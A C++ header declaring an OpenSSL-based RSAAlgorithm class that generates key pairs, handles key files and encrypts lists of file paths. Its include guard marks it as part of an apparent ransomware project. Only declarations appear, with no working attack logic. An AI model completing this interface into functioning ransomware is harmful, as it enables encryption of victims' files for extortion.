//
// Created on 22.01.20.
//

#ifndef RANSOMWARE_RSA_ALGO_H
#define RANSOMWARE_RSA_ALGO_H

#include <iostream>
#include <fstream>
#include <boost/filesystem/path.hpp>
#include <openssl/rsa.h>

#include "algorithm.h"

/**
 * Class RSAAlgorithm
 */
class RSAAlgorithm : public Algorithm {

private:
    std::vector<boost::filesystem::path> _files;
    char *_privateKeyStr;
    char *_publicKeyStr;
    int _encrypt_len;

    static RSA *_keypair;
    static RSA *_privateKey;
    static RSA *_publicKey;

    /**
     * generates the RSA keypairs
     *
     * @return bool true or false
     */
    bool generateKeyPair();

    /**
     * extracts the private and public rsa key from the generated rsa keypair
     *
     * @return bool true or false
     */
    bool extractKeys();

public:
    /**
     * Constructor
     */
    RSAAlgorithm();

    /**
     * Destructor
     */
    ~RSAAlgorithm();

    void encrypt(std::vector<boost::filesystem::path>&);
    void encrypt();
    void decrypt();

    void encrypt(RSA* publicKey);
    void decrypt(RSA* privateKey);

    /**
     * creates the private key string
     *
     * @param file: bool true or false
     */
    void createPrivateKeyStr(bool file);

    /**
     * creates the public key string
     *
     * @param file: bool true or false
     */
    void createPublicKeyStr(bool file);

    RSA* readPublicKeyFile(const std::string& filepath);

    RSA* readPrivateKeyFile(const std::string& filepath);

    /**
     * get the private key string
     *
     * @return char*
     */
    char* getPrivateKeyStr();

    /**
     * get the public key string
     *
     * @return char*
     */
    char* getPublicKeyStr();

    /**
     * get the raw rsa private key structure
     *
     * @return RSA*
     */
    RSA* getPrivateKey();

    /**
     * get the raw rsa public key structure
     */
    RSA* getPublicKey();

};


#endif //RANSOMWARE_RSA_ALGO_H
